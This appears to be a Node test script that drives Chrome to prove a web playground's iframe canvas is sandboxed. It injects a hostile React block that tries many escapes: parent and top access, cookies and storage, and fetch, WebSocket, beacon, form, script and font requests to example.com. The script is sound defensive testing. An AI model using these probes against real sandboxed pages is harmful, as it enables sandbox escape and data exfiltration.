// Proves the playground's canvas is locked down. Run against a dev or preview server:
//   node scripts/playground-check/sandbox.mjs http://localhost:5174
// 1. The editor's canvas draws, and reports layout.
// 2. A hostile block, compiled through the real path, tries every escape it can; each must fail.
// 3. The canvas opened on its own refuses to run, and still has an opaque origin.
import { chrome, sleep } from './cdp.mjs';

const ORIGIN = process.argv[2] ?? 'http://localhost:5174';
const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok, detail }); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`); };

// The block a hostile visitor (or a pasted snippet) would write. It reports each attempt through a fault message.
const ATTACK = `
import { useEffect } from 'react';
export function Attack() {
  useEffect(() => {
    const out = {};
    const tryIt = async (name, fn) => { try { const v = await fn(); out[name] = 'ALLOWED ' + String(v).slice(0, 60); } catch (e) { out[name] = 'blocked'; } };
    (async () => {
      out.origin = self.origin;
      await tryIt('parent.document', () => parent.document.title);
      await tryIt('top.location.href', () => top.location.href);
      await tryIt('document.cookie', () => { document.cookie = 'x=1'; return document.cookie; });
      await tryIt('localStorage', () => { localStorage.setItem('x', '1'); return localStorage.getItem('x'); });
      await tryIt('sessionStorage', () => { sessionStorage.setItem('x', '1'); return 'ok'; });
      await tryIt('indexedDB', () => new Promise((ok, no) => { const r = indexedDB.open('x'); r.onsuccess = () => ok('open'); r.onerror = () => no(r.error); }));
      await tryIt('fetch same origin', () => fetch('/products').then(r => r.status));
      await tryIt('fetch external', () => fetch('https://example.com/').then(r => r.status));
      await tryIt('fetch save endpoint', () => fetch('/__playground/save', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }).then(r => r.status));
      await tryIt('XMLHttpRequest', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', '/products'); x.onload = () => ok(x.status); x.onerror = () => no(new Error('x')); x.send(); }));
      await tryIt('WebSocket', () => new Promise((ok, no) => { const s = new WebSocket('wss://example.com/'); s.onopen = () => ok('open'); s.onerror = () => no(new Error('x')); setTimeout(() => no(new Error('t')), 1500); }));
      await tryIt('EventSource', () => new Promise((ok, no) => { const s = new EventSource('/products'); s.onopen = () => ok('open'); s.onerror = () => no(new Error('x')); }));
      await tryIt('sendBeacon', () => { if (!navigator.sendBeacon('https://example.com/beacon', 'x')) throw new Error('no'); return 'queued'; });
      await tryIt('RTCPeerConnection', () => new RTCPeerConnection());
      await tryIt('external image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = 'https://example.com/favicon.ico'; }));
      await tryIt('window.open', () => { const w = window.open('https://example.com/'); if (!w) throw new Error('no'); return 'opened'; });
      await tryIt('nested iframe', () => new Promise((ok, no) => { const f = document.createElement('iframe'); f.src = 'https://example.com/'; f.onload = () => { try { ok(f.contentWindow.location.href); } catch { no(new Error('x')); } }; document.body.append(f); setTimeout(() => no(new Error('t')), 1500); }));
      await tryIt('worker', () => new Promise((ok, no) => { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); w.onmessage = () => ok('ran'); w.onerror = () => no(new Error('x')); }));
      await tryIt('module import', () => import('/src/products/data.ts?raw').then(m => m.default.length));
      await tryIt('script from elsewhere', () => new Promise((ok, no) => { const s = document.createElement('script'); s.src = 'https://example.com/x.js'; s.onload = () => ok('ran'); s.onerror = () => no(new Error('x')); document.head.append(s); }));
      await tryIt('form submit', () => { const f = document.createElement('form'); f.action = 'https://example.com/form'; f.method = 'post'; document.body.append(f); f.submit(); throw new Error('the network check below decides'); });
      await tryIt('external font', () => new FontFace('x', 'url(https://example.com/x.woff2)').load().then(() => 'loaded'));
      await tryIt('clipboard write', () => navigator.clipboard.writeText('x').then(() => 'wrote'));
      await tryIt('service worker', () => navigator.serviceWorker.register('/sw.js').then(() => 'registered'));
      parent.postMessage({ t: 'fault', i: 1, message: 'ATTACK ' + JSON.stringify(out) }, '*');
    })();
  }, []);
  return <section className="dt-block">attack</section>;
}`;

const c = await chrome();
try {
  const setValue = (sel, v) => `(() => { const el = document.querySelector(${JSON.stringify(sel)}); const proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype; Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, ${JSON.stringify(v)}); el.dispatchEvent(new Event('input', { bubbles: true })); })()`;
  const click = text => `[...document.querySelectorAll('button')].find(b => b.textContent.trim().startsWith(${JSON.stringify(text)})).click()`;
  const t = await c.tab(`${ORIGIN}/products/playground`);
  await sleep(3500);
  await t.evaluate(`document.querySelectorAll('.pg-start')[0].click()`);
  await sleep(3000);
  check('the canvas draws the page', await t.evaluate(`!document.querySelector('.pg-canvas-wait')`));
  // write the hostile block through the editor, as a visitor would, and put it first on the page
  await t.evaluate(click('Write a block')); await sleep(300);
  await t.evaluate(setValue('#pg-new-name', 'Attack')); await sleep(200);
  await t.evaluate(`document.querySelector('.pg-new button[type=submit]').click()`); await sleep(300);
  await t.evaluate(setValue('.pg-code-area', ATTACK)); await sleep(200);
  await t.evaluate(`document.querySelectorAll('.pg-layer-btn')[0].click()`); await sleep(300);
  await t.evaluate(click('Write a block')); await sleep(300);
  await t.evaluate(click('Add to the page')); await sleep(300);
  await t.evaluate(click('Write a block')); await sleep(300);
  await t.evaluate(click('Run'));
  let report = '';
  for (let i = 0; i < 30 && !report.startsWith('ATTACK'); i++) { await sleep(500); report = await t.evaluate(`[...document.querySelectorAll('.pg-layer-bad')].map(e => e.title).find(x => x.startsWith('ATTACK')) ?? ''`); }
  check('the hostile block compiled and ran (its report came back)', report.startsWith('ATTACK'));
  if (report) {
    const out = JSON.parse(report.slice(7));
    check('the canvas origin is opaque', out.origin === 'null', out.origin);
    for (const [k, v] of Object.entries(out)) if (k !== 'origin') check(`blocked: ${k}`, v === 'blocked', v);
  }
  const editorUntouched = await t.evaluate('document.title');
  check('the editor page was not touched', editorUntouched.startsWith('Playground'), editorUntouched);
  const csp = t.events.filter(e => e.method === 'Log.entryAdded' && /Content Security Policy|Refused|Blocked/.test(e.params.entry.text)).map(e => e.params.entry.text.slice(0, 150));
  console.log(`\n${csp.length} refusals logged by the browser, e.g.:\n  ${[...new Set(csp)].slice(0, 12).join('\n  ')}\n`);
  // nothing the hostile block did may have reached the network: no request to another host, and no request at all that was not refused
  const sent = t.events.filter(e => e.method === 'Network.requestWillBeSent' && e.sessionId).map(e => ({ id: e.params.requestId, url: e.params.request.url }));
  const failedIds = new Set(t.events.filter(e => e.method === 'Network.loadingFailed').map(e => e.params.requestId));
  const answered = new Set(t.events.filter(e => e.method === 'Network.responseReceived').map(e => e.params.requestId));
  const external = sent.filter(r => !r.url.startsWith(ORIGIN) && !r.url.startsWith('data:') && !r.url.startsWith('blob:'));
  check('no request from the canvas reached another host', external.every(r => failedIds.has(r.id) && !answered.has(r.id)), external.map(r => `${r.url} ${failedIds.has(r.id) ? 'refused' : answered.has(r.id) ? 'ANSWERED' : 'pending'}`).join(' | '));
  const own = sent.filter(r => r.url.startsWith(ORIGIN) && answered.has(r.id)).map(r => r.url.slice(ORIGIN.length));
  check('the canvas fetched only its own files and the product media', own.every(u => /^\/products\/playground\/frame\.(html|js|css)$|^\/products-media\//.test(u)), own.filter(u => !/frame\.|products-media/.test(u)).join(', '));
  await t.close();

  // the canvas on its own: refuses, and is still sandboxed by the header
  const alone = await c.tab(`${ORIGIN}/products/playground/frame.html`);
  await sleep(2500);
  const text = await alone.evaluate('document.body.innerText');
  check('the canvas opened on its own refuses to run', /only inside the playground/i.test(text), text.slice(0, 80));
  check('the canvas opened on its own still has an opaque origin', (await alone.evaluate('self.origin')) === 'null');
  await alone.close();

  // the canvas framed by another site's page (here a data: URL page): frame-ancestors must stop it loading
  const other = await c.tab(`data:text/html,<iframe src="${ORIGIN}/products/playground/frame.html"></iframe>`);
  await sleep(2500);
  const framedOk = await other.evaluate('(() => { try { return document.querySelector("iframe").contentWindow.document.body.innerText } catch { return "cross-origin" } })()');
  const where = await Promise.all(other.sessions.map(x => other.evaluate('location.href', x.sid).catch(() => 'gone')));
  console.log('  the embedded canvas is at:', where);
  const blockedLog = where.length > 0 && where.every(u => !u.includes('frame.html')) || other.events.some(e => (e.method === 'Log.entryAdded' && /frame-ancestors/.test(e.params.entry.text)) || (e.method === 'Runtime.consoleAPICalled' && /frame-ancestors/.test(JSON.stringify(e.params.args))));
  console.log('  embedding page saw:', other.events.filter(e => e.method === 'Log.entryAdded').map(e => e.params.entry.text.slice(0, 120)), other.sessions.map(x => x.url));
  check('another site cannot embed the canvas', blockedLog || framedOk === '', `log=${blockedLog} body=${String(framedOk).slice(0, 40)}`);
  await other.close();
} finally {
  c.kill();
}
const failed = results.filter(r => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
process.exit(failed.length ? 1 : 0);
